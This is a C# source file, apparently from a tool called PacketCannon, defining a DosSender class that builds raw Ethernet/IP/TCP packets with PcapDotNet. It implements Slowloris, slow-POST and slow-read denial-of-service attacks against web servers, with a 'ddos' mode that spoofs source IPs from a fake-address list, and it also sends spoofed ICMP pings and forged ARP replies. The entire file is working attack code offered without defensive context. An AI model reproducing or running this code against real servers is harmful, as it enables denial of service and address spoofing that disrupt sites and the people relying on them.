using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Http;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.Transport;
using System;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Text.RegularExpressions;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Icmp;
using static PacketCannon.SenderStatus;
using HttpVersion = PcapDotNet.Packets.Http.HttpVersion;
using PcapDotNet.Base;

namespace PacketCannon
{
    public class DosSender
    {
        public DosSender(IPacketDevice packetDevice, string sourceIp, string destIp, string host, string slowLorisKeepAliveData, string slowLorisHeaderNotComplete, int slowPostHeaderContentLength, string slowPostHeader, string slowReadUrl, int startPort, int portStep, bool ddos = false)
        {
            if (ddos)
            {
                Random rand = new Random();
                SourceIpV4 = DosController.FakeIpV4Addresses[rand.Next() % DosController.FakeIpV4Addresses.Count];
            }
            else
            {
                SourceIpV4 = new IpV4Address(sourceIp);
            }
            DestinationIpV4 = new IpV4Address(destIp);
            SourceMac = new MacAddress(Regex.Replace(
                NetworkInterface.GetAllNetworkInterfaces()
                    .FirstOrDefault(netInt => packetDevice.Name.Contains(netInt.Id))
                    ?.GetPhysicalAddress().ToString() ?? throw new InvalidOperationException(),
                    ".{2}", "$0:").TrimEnd(':'));

            DestinationMac = DosController.GetMacFromIp(destIp);

            SlowLorisHeaderNotComplete = slowLorisHeaderNotComplete;

            //if (slowLorisHeaderNotComplete == null)
            //{
            //    SlowLorisHeaderNotComplete = "GET /?654865241562456 HTTP/1.1\r\n" + $"Host: {host}  \r\n" +
            //                                 "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42";
            //}

            SlowPostHeader = slowPostHeader + $"Content-Length: {SlowPostContentLength}\r\n\r\n name=";
            //if (slowPostHeader == null)
            //{
            //    SlowPostHeader = "POST " + "/textform.php" + " HTTP/1.1\r\n" + $"Host: {host}  \r\n" + "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: " + SlowPostContentLength + "\r\n\r\n" + "name=";
            //}

            SlowReadUrl = slowReadUrl;
            SlowPostContentLength = slowPostHeaderContentLength;
            SlowLorisKeepAliveData = slowLorisKeepAliveData;
            Host = host;
            SourcePort = (ushort)(startPort + NextSourcePort);
            NextSourcePort += (ushort)portStep;
        }

        public MacAddress SourceMac { get; set; }
        public MacAddress DestinationMac { get; set; }
        public IpV4Address SourceIpV4 { get; set; }
        public IpV4Address DestinationIpV4 { get; set; }
        public string Host { get; set; }
        public SenderStat Status = SenderStat.SendSyn;
        public static ushort NextSourcePort;
        public readonly int SlowPostContentLength;
        public readonly string SlowLorisKeepAliveData;
        public readonly string SlowLorisHeaderNotComplete;
        public readonly string SlowPostHeader;
        public string SlowReadUrl { get; set; }

        public void SendSyn(PacketCommunicator communicator)
        {
            // Ethernet Layer
            EthernetLayer ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            // IPv4 Layer
            IpV4Layer ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber,
            };

            // TCP Layer
            TcpLayer tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                ControlBits = TcpControlBits.Synchronize,
                Window = WindowSize,
            };

            communicator.SendPacket(PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer));
            ExpectedAckNumber = SeqNumber + 1;
        }

        public void SendAck(PacketCommunicator communicator)
        {
            // Ethernet Layer
            EthernetLayer ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            // IPv4 Layer
            IpV4Layer ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber,
            };

            // TCP Layer
            TcpLayer tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                AcknowledgmentNumber = AckNumber,
                ControlBits = TcpControlBits.Acknowledgment,
                Window = WindowSize,
            };

            communicator.SendPacket(PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer));
            _identificatioNumber++;
        }

        public void SendKeepAliveForSlowLoris(PacketCommunicator communicator)
        {
            // Ethernet Layer
            EthernetLayer ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            // IPv4 Layer
            IpV4Layer ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber,
            };

            // TCP Layer
            TcpLayer tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                AcknowledgmentNumber = AckNumber,
                ControlBits = (TcpControlBits)24,
                Window = 222,
            };

            PayloadLayer httPayloadLayer = new PayloadLayer()
            {
                Data = new Datagram(Encoding.ASCII.GetBytes(SlowLorisKeepAliveData + "\r\n"))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httPayloadLayer);

            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.PayloadLength;
        }

        public void SendKeepAliveForSlowPost(PacketCommunicator communicator)
        {
            // Ethernet Layer
            EthernetLayer ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            // IPv4 Layer
            IpV4Layer ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber,
            };

            // TCP Layer
            TcpLayer tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                AcknowledgmentNumber = AckNumber,
                ControlBits = (TcpControlBits)24,
                Window = 222,
            };

            var a = (char)('a' + new Random().Next(0, 26));

            PayloadLayer httPayloadLayer = new PayloadLayer()
            {
                Data = new Datagram(Encoding.ASCII.GetBytes($"{a}"))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httPayloadLayer);

            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.PayloadLength;
        }

        public void SendGetNotComplete(PacketCommunicator communicator)
        {
            // Ethernet Layer
            var ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            // IPv4 Layer
            var ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber,
            };

            // TCP Layer
            var tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                AcknowledgmentNumber = AckNumber,
                ControlBits = (TcpControlBits)24,
                Window = WindowSize,
            };

            var httpPayloadLayer = new PayloadLayer()
            {
                Data = new Datagram(Encoding.ASCII.GetBytes(SlowLorisHeaderNotComplete))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httpPayloadLayer);
            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.Http.Length;
            _identificatioNumber++;
        }

        public void SendCompleteGetForSlowRead(PacketCommunicator communicator)
        {
            // Ethernet Layer
            var ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            // IPv4 Layer
            var ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber,
            };

            // TCP Layer
            var tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                AcknowledgmentNumber = AckNumber,
                ControlBits = TcpControlBits.Acknowledgment,
                Window = WindowSize,
            };

            HttpRequestLayer httpRequestLayer = new HttpRequestLayer
            {
                Uri = SlowReadUrl,
                Method = new HttpRequestMethod(HttpRequestKnownMethod.Get),
                Version = HttpVersion.Version11,
                Header = new HttpHeader(HttpField.CreateField("Host", Host))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httpRequestLayer);
            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.Http.Length;
            _identificatioNumber++;
        }

        public void SendSlowPostHeader(PacketCommunicator communicator)
        {
            // Ethernet Layer
            var ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            // IPv4 Layer
            var ipV4Layer = new IpV4Layer
            {
                Source = SourceIpV4,
                CurrentDestination = DestinationIpV4,
                Ttl = 128,
                Fragmentation = new IpV4Fragmentation(IpV4FragmentationOptions.DoNotFragment, 0),
                Identification = _identificatioNumber,
            };

            // TCP Layer
            var tcpLayer = new TcpLayer
            {
                SourcePort = SourcePort,
                DestinationPort = DestinationPort,
                SequenceNumber = SeqNumber,
                AcknowledgmentNumber = AckNumber,
                ControlBits = (TcpControlBits)24,
                Window = WindowSize,
            };

            var httpPayloadLayer = new PayloadLayer()
            {
                Data = new Datagram(Encoding.ASCII.GetBytes(SlowPostHeader))
            };

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, tcpLayer, httpPayloadLayer);
            communicator.SendPacket(packet);
            SeqNumber += (uint)packet.Ethernet.IpV4.Tcp.Http.Length;
            _identificatioNumber++;
        }

        public void PingAddress(PacketCommunicator communicator, IpV4Address ipAddress)
        {
            EthernetLayer ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac
            };

            // IPv4 Layer
            IpV4Layer ipV4Layer = new IpV4Layer
            {
                Source = ipAddress,
                Ttl = 128,
                CurrentDestination = DestinationIpV4
            };

            var icmpLayer = new IcmpEchoLayer();

            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, ipV4Layer, icmpLayer);
            communicator.SendPacket(packet);
        }

        public void SendArpResponse(PacketCommunicator communicator, IpV4Address ipAddress)
        {
            var ethernetLayer = new EthernetLayer
            {
                Source = SourceMac,
                Destination = DestinationMac,
            };

            var a = Regex.Matches(SourceMac.ToString().Replace(":", ""), @"\S{2}").Cast<Match>().Select(m => m.Value).ToArray();
            var macParsed = new byte[a.Length];
            for (int i = 0; i < a.Length; i++)
            {
                macParsed[i] = (byte)int.Parse(a[i], System.Globalization.NumberStyles.HexNumber);
            }
            var b = Regex.Matches(DestinationMac.ToString().Replace(":", ""), @"\S{2}").Cast<Match>().Select(m => m.Value).ToArray();
            var targetMacParsed = new byte[b.Length];
            for (int i = 0; i < b.Length; i++)
            {
                targetMacParsed[i] = (byte)int.Parse(b[i], System.Globalization.NumberStyles.HexNumber);
            }

            ArpLayer arpLayer = new ArpLayer
            {
                ProtocolType = EthernetType.IpV4,
                Operation = ArpOperation.Reply,
                SenderHardwareAddress = macParsed.AsReadOnly(),
                SenderProtocolAddress = ipAddress.ToString().Split('.').Select(n => Convert.ToByte(n)).ToArray().AsReadOnly(),
                TargetHardwareAddress = macParsed.AsReadOnly(),
                TargetProtocolAddress = DestinationIpV4.ToString().Split('.').Select(n => Convert.ToByte(n)).ToArray().AsReadOnly(),
            };
            var packet = PacketBuilder.Build(DateTime.Now, ethernetLayer, arpLayer);
            communicator.SendPacket(packet);
        }

        public readonly ushort SourcePort;
        public static ushort DestinationPort = 80;
        public uint SeqNumber = (uint)new Random().Next();
        public uint ExpectedAckNumber;
        public ushort WindowSize = 8192;
        public uint AckNumber;
        private ushort _identificatioNumber = (ushort)new Random().Next(100, 1000);
    }
}